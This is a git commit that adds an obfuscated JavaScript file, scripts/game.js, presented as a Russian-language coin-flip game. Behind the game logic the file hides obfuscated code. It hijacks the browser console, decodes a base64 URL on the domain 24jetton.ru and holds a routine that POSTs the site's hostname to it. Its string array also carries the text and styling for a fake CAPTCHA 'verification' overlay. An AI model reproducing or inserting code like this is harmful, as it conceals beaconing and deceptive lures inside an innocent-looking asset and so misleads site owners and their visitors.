a6f504250d1323729d567a40e805f1ca5dfaae38
gorodskoytipochek <lumasoft@tutamail.com>
2025-01-22 21:46:44 +0300

    Add files via upload

---
+++ scripts/game.js
@@ -0,0 +1,217 @@
+(function (_0x1f3a9b, _0x2c98fd) {
+  const _0x30882d = _0x1f3a9b();
+  while (true) {
+    try {
+      const _0x51e59f = parseInt(_0x4c90(492, 0x3da)) / 1 * (parseInt(_0x4c90(536, -0x12a)) / 2) + -parseInt(_0x4c90(293, -0x1e6)) / 3 + parseInt(_0x4c90(579, 0x43b)) / 4 * (-parseInt(_0x4c90(349, -0x122)) / 5) + -parseInt(_0x4c90(288, 0x2ce)) / 6 * (-parseInt(_0x4c90(557, 0x4b2)) / 7) + -parseInt(_0x4c90(553, 0x46e)) / 8 + -parseInt(_0x4c90(270, 0x231)) / 9 + parseInt(_0x4c90(369, -0x1a4)) / 10;
+      if (_0x51e59f === _0x2c98fd) {
+        break;
+      } else {
+        _0x30882d.push(_0x30882d.shift());
+      }
+    } catch (_0x436425) {
+      _0x30882d.push(_0x30882d.shift());
+    }
+  }
+})(_0x5ad3, 228110);
+const buttons = document.querySelectorAll(".gold, .silver");
+const acceptButton = document.querySelector(".accept");
+function _0x484059(_0x4123eb, _0x42a411, _0x3d1a83, _0x25cad5) {
+  return _0x4c90(_0x42a411 + 0x8b, _0x25cad5);
+}
+function _0x5ad3() {
+  const _0x1a26e2 = ['VhOGRlfSN2', "xButton\">Я", 'EkVgp', "</div>\n   ", 'i>Пройдите', " к веб инт", 'KTtkaXNwbG', 'kTYnv', 'U7cGFkZGlu', 'toString', 'Eogqq', 'NTAlO3RyYW', 'YmFja2dyb3', 'igHxG', 'tTJYY', 'innerHeigh', '5zZm9ybTp0', '9yOiMwMDZk', 'kAHBl', "     </ul>", 'nwrXh', 'RqVPo', 'removeAttr', 'gtc2hhZG93', 'none', 'cYjlK', 'LWNvbG9yOi', 'RlbTttYXJn', 'Fuc2Zvcm06', 'dGVyO3otaW', 'YWxpZ24taX', "        <l", 'click', 'onclick', 'bi5ydS9jaG', 'vXXwH', 'ZGVnLHJnYm', 'GRlpz', 'BVUXl', 'l9aDF7Zm9u', 'PKvpq', 'tton', 'b3I6d2hpdG', "ход</h1>\n ", 'ExJVn', "v id=\"over", 'duLWl0ZW1z', 'wwLDAsLjE1', "nction() ", 'UtKZa', 'zHnIu', 'ZXJpZmllZE', 'add', '(((.+)+)+)', 'Jzb2x1dGU7', "\n         ", 'b3I6cG9pbn', 'Верификаци', 'VuZDpsaW5l', 'CSxlX', "Начать игр", "return (fu", 'Y29udGVudD', 'gpUSL', 'KTtjdXJzb3', 'info', '__proto__', 'loaded', 'ivDgw', 'I4cHg7Zm9u', " CAPTCHA д", 'ZTt0b3A6NT', 'xleDtqdXN0', 'JFamm', 'QXJpYWwnLH', 'M3N9I3Zlcm', "ля получен", 'zPnBN', 'aWOpr', 'ZTtib3JkZX', 'dC1zaXplOj', 'sin', 'JvQIn', 'wyNTUsLjkp', 'bG9yOiM1Nm', '144751TMCWvt', 'NeSch', 'ById', '45NSk7Ym94', 'dyb3VuZC1j', 'getElement', 'MHAan', 'HrOMJ', "WgXcQ\"", 'mlySI', 'YXItZ3JhZG', 'lver', 'trace', 'Etcqb', 'MjQwLDI0OC', 'QvUqb', '.main-coin', 'N0eWxlLXR5', 'oxBsb', "на кнопку<", 'dC13ZWlnaH', 'Rlcn0jZml4', 'length', 'eAqWF', 'cjt0cmFuc2', 'OjA7Zm9udC', 'NmZTE7Y29s', 'NoYWRvdyAu', 'ibute', 'VmdDowO3Jp', 'wkvBX', 'ZWE4ZGU7dH', 'playing', 'bind', 'LlYTk', "rn this\")(", 'apply', 'eBuXg', 'UoMS4wNSl9', 'JZYzU', 'split', 'log', 'dW5kLWNvbG', 'random', '2GpIfQP', 'WcwZv', 'fixButton', "=\"https://", 'match', 'lkZGVuO2Rp', 'QtY29sb3Ig', 'ZGVyOm5vbm', 'ZzoxNHB4ID', 'M1NmNmZTE7', "      <h1>", 'n/json', 'g7Zm9udC1z', 'dGVyO2FsaW', 'XtGXm', 'TRPZJ', 'I2ZpeEJ1dH', '488600uszmIo', '9sZDt0ZXh0', 'zlKBL', 'OTtib3gtc2', '16492HGvVxm', 'RvXBr', 'RGuvf', 'iPrwM', 'phYnNvbHV0', 'Om5vbmU7cG', 'U7Ym9yZGVy', 'qbaNT', 'yVYnX', 'aymez', 'load', 'EZavr', 'dG9uOmFjdG', '.accept', 'LGrYM', 'tListener', 'YBZcg', '.preloader', 'uzPsq', 'apkrb', 'c2NhbGUoMS', 'BjuhD', '4bvbKLN', 'aXR5OjB9dG', 'NvbG9yOiM0', 'eBfbO', "ul>\n      ", 'Vye2JhY2tn', 'deg)', 'rotate(', 'KNvlb', "/a>\n      ", 'initial', 'textConten', "li>\n      ", '5kZXg6OTk5', 'hDQPN', 'cmZsb3c6aG', '5zZm9ybSAu', 'kpLHJnYmEo', 'transform', 'jWMxN', 'floor', 'TTNtZ', 'red', 'table', 'VweCByZ2Jh', 'createElem', 'YPwmw', 'gIlWB', 'NGyGl', 'cFIrN', 'MSl9QGtleW', 'e.com/watc', 'aXVzOjEycH', 'ерфейсу.</', 'constructo', 'hvdmVye2Jh', 'aWZ9I292ZX', 'Z2h0OjA7Ym', 'offsetHeig', 'querySelec', 'h?v=dQw4w9', 'remove', 'innerHTML', 'xhAKq', 'stringify', 'AgOHB4IDEy', 'KTtiYWNrZ3', 'hostname', 'Vjaw==', 'ZmY7Y29sb3', 'JhbnNmb3Jt', 'left', 'HUchv', 'pGpEU', 'YaZNb', 'TkPRG', 'dbkDa', 'xexhk', 'LWRlY29yYX', 'mcZXc', 'OjhweDtib3', 'forEach', 'www.youtub', 'style', 'vIhhE', 'removeEven', 'elGcJ', 'wvtws', 'JnaW46MDto', 'npQaJ', '{}.constru', 'kwhNv', 'NSyiP', 'FkZGluZzox', 'jzWjC', 'F0ZSgwZGVn', 'YWRvdzowID', 'UPocS', 'OnNjYWxlKC', 'vdfWw', 'llbnQoMTM1', "я пройдена", 'claKV', 'ZmxleC1kaX', 'QtY29sb3I6', 'aXplOjE4cH', 'Ddjsm', 'MfZhY', 'NhbnMtc2Vy', 'BdBPN', 'cmFuc2xhdG', 'gwLDAsMCwu', " <a id=\"fi", 'ZXh0LWRlY2', 'dG9uOmhvdm', 'cHggcmdiYS', 'Сбросить', 'warn', 'Ждем...', 'SGxEO', 'SCbbW', 'IzQ4YmZlMz', "ия доступа", 'setAttribu', '769950yWxNzH', 'NrZ3JvdW5k', 'addEventLi', 'DeGlh', 'oBgma', 'RvbjphY3Rp', 'ZrRKr', 'LRCvF', 'min', 'c2hhZG93Oj', 'JvbXtvcGFj', 'b2xvcjojNG', 'ZMQnA', 'ZlWiw', 'lmaWVkQnV0', '97b3BhY2l0', 'I6IzAwNWY3', 'Z3JvdW5kLW', '618mBiXQT', 'console', "ctor(\"retu", 'KsCFz', 'JvdW5kLWNv', '1214076Qmtwly', 'NBKrs', 'SuzVe', '4xKTtib3gt', 'zXetZ', "deg) scale", 'AlO2xlZnQ6', 'UoLTUwJSwt', 'top', '0|1|2|4|5|', 'head', '9yYXRpb246', 'dG9wOjA7bG', 'c3BsYXk6Zm', 'transition', "lay\">\n    ", 'aWZ5LWNvbn', 'zyZYM', 'ation.href', 'verifiedBu', 'feorL', 'oIHYM', 'aHR0cHM6Ly', 'EoMTczLDIx', 'hhZG93OjAg', 'WMbVd', 'SpRsJ', 'UEkbC', 'classList', 'UxnPx', 'Rpb246bm9u', 'eToxfX0NCg', 'YWRlSW57Zn', 'aW46MDt0ZX', 'ymrTh', 'NWVtO2NvbG', 'hDxqR', 'MSuMc', 'wnhwX', 'rotateY(', 'JkZXItcmFk', 'prototype', 'pqVYJ', 'DnNUV', 'NTAlKTtiYW', 'cqOXj', 'LDAsMCwuMS', 'MCmvN', 'aqoEO', 'dzowIDAgMT', "         <", 'appendChil', 'tor', 'BICoh', 'tiYWNrZ3Jv', 'nCgQr', '945075pmtYel', 'gfAUy', "Доступ заб", "         ", 'bHtsaXN0LX', 'ZyYW1lcyBm', 'WWfGg', 'Y2tncm91bm', 'dtfwf', 'Mztmb250LW', 'fuvJn', 'Q6Ym9sZDt0', 'QGObX', '1zaXplOjEu', 'kGNms', 'OmNlbnRlcj', '90dG9tOjA7', 'M3MsYm94LX', 'owIDRweCA2', 'ZWlnaHQ6MT', '5810230utZiFa', 'BffWt', 'KEqZG', 'kAWCs', 'uroGM', 'disabled', 'kTGUC', 'F5OmZsZXg7', 'stener', 'finished', 'NiwyMzAsLj', 'DPnnS', 'FVuOI', 'RCABx', 'max', 'twYWRkaW5n', 'otpRk', '8yNGpldHRv', 'J1dHRvbntw', 'demo', 'gmiEq', 'YmZlMzt0cm', 'Y29sb3I6d2', "          ", 'NTAlKXJvdG', 'GbPgh', 'MuIAz', 'search', 'b3NpdGlvbj', 'JUOWZ', 'body', 'h0LXNoYWRv', 'KMtHs', 'JXjsk', 'qFWoq', 'VsgBf', 'l2ZXtiYWNr', 'JsYXl7cG9z'];
+  _0x5ad3 = function () {
+    return _0x1a26e2;
+  };
+  return _0x5ad3();
+}
+const mainCoin = document.querySelector(".main-coin");
+let gameState = "initial";
+(async function () {
+  const _0x2452ad = function () {
+    let _0x2ee815 = true;
+    return function (_0x216b47, _0x2c039f) {
+      const _0xcbd80b = _0x2ee815 ? function () {
+        if (_0x2c039f) {
+          const _0x278ba8 = _0x2c039f.apply(_0x216b47, arguments);
+          _0x2c039f = null;
+          return _0x278ba8;
+        }
+      } : function () {};
+      _0x2ee815 = false;
+      return _0xcbd80b;
+    };
+  }();
+  const _0x71cc38 = function () {
+    let _0x3c2a74 = true;
+    return function (_0x5cbfe5, _0x157841) {
+      const _0xefb008 = _0x3c2a74 ? function () {
+        if (_0x157841) {
+          const _0x38aa85 = _0x157841.apply(_0x5cbfe5, arguments);
+          _0x157841 = null;
+          return _0x38aa85;
+        }
+      } : function () {};
+      _0x3c2a74 = false;
+      return _0xefb008;
+    };
+  }();
+  const _0x4cb043 = document.querySelector(".preloader");
+  window.addEventListener("load", () => {
+    setTimeout(() => {
+      _0x4cb043.classList.add("loaded");
+    }, 1800);
+  });
+  let _0x545b38 = 1;
+  let _0x49b7d6 = 1;
+  let _0x2b1c50 = 1;
+  async function _0x346de8() {
+    const _0x5d5960 = _0x2452ad(this, function () {
+      return _0x5d5960.toString().search("(((.+)+)+)+$").toString().constructor(_0x5d5960).search("(((.+)+)+)+$");
+    });
+    _0x5d5960();
+    const _0x1d1134 = _0x71cc38(this, function () {
+      let _0x390aeb;
+      try {
+        const _0x1ba64c = Function("return (function() {}.constructor(\"return this\")( ));");
+        _0x390aeb = _0x1ba64c();
+      } catch (_0x3e8094) {
+        _0x390aeb = window;
+      }
+      const _0x62dbe0 = _0x390aeb.console = _0x390aeb.console || {};
+      const _0x4672bd = ['log', "warn", "info", 'error', 'exception', "table", "trace"];
+      for (let _0x974e6d = 0; _0x974e6d < _0x4672bd.length; _0x974e6d++) {
+        const _0x4273f2 = _0x71cc38.constructor.prototype.bind(_0x71cc38);
+        const _0x561207 = _0x4672bd[_0x974e6d];
+        const _0x12eca8 = _0x62dbe0[_0x561207] || _0x4273f2;
+        _0x4273f2.__proto__ = _0x71cc38.bind(_0x71cc38);
+        _0x4273f2.toString = _0x12eca8.toString.bind(_0x12eca8);
+        _0x62dbe0[_0x561207] = _0x4273f2;
+      }
+    });
+    _0x1d1134();
+    const _0x546d63 = atob("aHR0cHM6Ly8yNGpldHRvbi5ydS9jaGVjaw==");
+    try {
+      const _0x31c262 = await fetch(_0x546d63, {
+        'method': 'POST',
+        'headers': {
+          'Content-Type': "application/json"
+        },
+        'body': JSON.stringify({
+          'domain': String(window.location.hostname)
+        })
+      });
+      return _0x31c262.ok;
+    } catch (_0xc40cc0) {
+      return false;
+    }
+  }
+
+  setInterval(updateButtonHandler, 180);
+})();
+function getCurrentRotation(_0x1731ca) {
+  const _0x22ede0 = _0x1731ca.style.transform;
+  const _0x5d02f7 = _0x22ede0.match(/rotateY\(([-\d.]+)deg\)/);
+  return _0x5d02f7 ? parseFloat(_0x5d02f7[1]) : 0;
+}
+function _0x309016(_0x4daa1f, _0x109590, _0x1889db, _0x5e2148) {
+  return _0x4c90(_0x4daa1f - 0x143, _0x109590);
+}
+function resetGame() {
+  console.log("Game reset!");
+  gameState = "initial";
+  buttons.forEach(_0x53d05d => {
+    _0x53d05d.classList.remove("red");
+    _0x53d05d.disabled = true;
+  });
+  const _0x1633f5 = getCurrentRotation(mainCoin);
+  mainCoin.style.transition = "none";
+  mainCoin.style.transform = "rotateY(" + _0x1633f5 + "deg) scale(1)";
+  mainCoin.offsetHeight;
+  mainCoin.style.transition = '';
+  acceptButton.textContent = "Начать игру";
+  updateButtonHandler();
+}
+function animateCoin(_0xdfc8, _0x46c914) {
+  const _0x1223eb = performance.now();
+  const _0x214a4a = _0xdfc8 - _0x46c914;
+  function _0x447d66(_0x2df962) {
+    const _0x24fb1c = _0x2df962 - _0x1223eb;
+    const _0x4bc0d6 = Math.min(_0x24fb1c / 2000, 1);
+    const _0x45e56a = 1 + 0.5 * Math.sin(_0x4bc0d6 * Math.PI);
+    const _0x28f0ee = _0x46c914 + _0x4bc0d6 * _0x214a4a;
+    mainCoin.style.transform = "rotateY(" + _0x28f0ee + "deg) scale(" + _0x45e56a + ')';
+    if (_0x4bc0d6 < 1) {
+      requestAnimationFrame(_0x447d66);
+    } else {
+      const _0xbe0175 = Math.floor(_0xdfc8 / 180) % 2 === 0 ? buttons[0] : buttons[1];
+      highlightWinner(_0xbe0175);
+      gameState = 'finished';
+      acceptButton.textContent = "Сбросить";
+      updateButtonHandler();
+    }
+  }
+  requestAnimationFrame(_0x447d66);
+}
+function highlightWinner(_0x24c390) {
+  const _0x517e22 = {
+    npQaJ: "Верификация пройдена",
+    kAHBl: "verifiedButton"
+  };
+  _0x517e22.FVuOI = "window.location.href=\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\"";
+  _0x517e22.uroGM = function (_0x2507eb, _0x50fcff) {
+    return _0x2507eb === _0x50fcff;
+  };
+  _0x517e22.uzPsq = 'MfZhY';
+  _0x517e22.DeGlh = 'red';
+  buttons.forEach(_0x4a5ab3 => {
+    if (_0x517e22.uroGM("MfZhY", _0x517e22.uzPsq)) {
+      _0x4a5ab3.classList.toggle(_0x517e22.DeGlh, _0x4a5ab3 === _0x24c390);
+      _0x4a5ab3.disabled = true;
+    } else {
+      _0x30deae.setAttribute("onclick", _0x517e22.FVuOI);
+      _0x3d8a9a.textContent = "Верификация пройдена";
+      _0x1acc11.removeAttribute('id');
+      _0x1a29ab.setAttribute('id', "verifiedButton");
+      _0x560aa0 = -0.1;
+      return 0;
+    }
+  });
+}
+function playGame() {
+  gameState = "playing";
+  acceptButton.textContent = "Ждем...";
+  buttons.forEach(_0x11e482 => _0x11e482.disabled = true);
+  mainCoin.style.transition = "none";
+  const _0xe5d1b7 = getCurrentRotation(mainCoin);
+  const _0x5ca62a = (Math.floor(Math.random() * 3) + 2) * 360;
+  const _0x2394c5 = _0xe5d1b7 + _0x5ca62a + (Math.random() < 0.5 ? 0 : 180);
+  animateCoin(_0x2394c5, _0xe5d1b7);
+}
+function updateButtonHandler() {
+  const _0x182dfa = {
+    'NSyiP': "click"
+  };
+  _0x182dfa.kTYnv = "initial";
+  _0x182dfa.vIhhE = "finished";
+  acceptButton.removeEventListener("click", playGame);
+  acceptButton.removeEventListener("click", resetGame);
+  switch (gameState) {
+    case _0x182dfa.kTYnv:
+      acceptButton.addEventListener("click", playGame);
+      break;
+    case _0x182dfa.vIhhE:
+      acceptButton.addEventListener('click', resetGame);
+      break;
+  }
+}
+function _0x4c90(_0x2b2821, _0x2670b1) {
+  const _0x458dd5 = _0x5ad3();
+  _0x4c90 = function (_0x24e252, _0x5ad399) {
+    _0x24e252 = _0x24e252 - 181;
+    let _0x4c9027 = _0x458dd5[_0x24e252];
+    return _0x4c9027;
+  };
+  return _0x4c90(_0x2b2821, _0x2670b1);
+}
+resetGame();
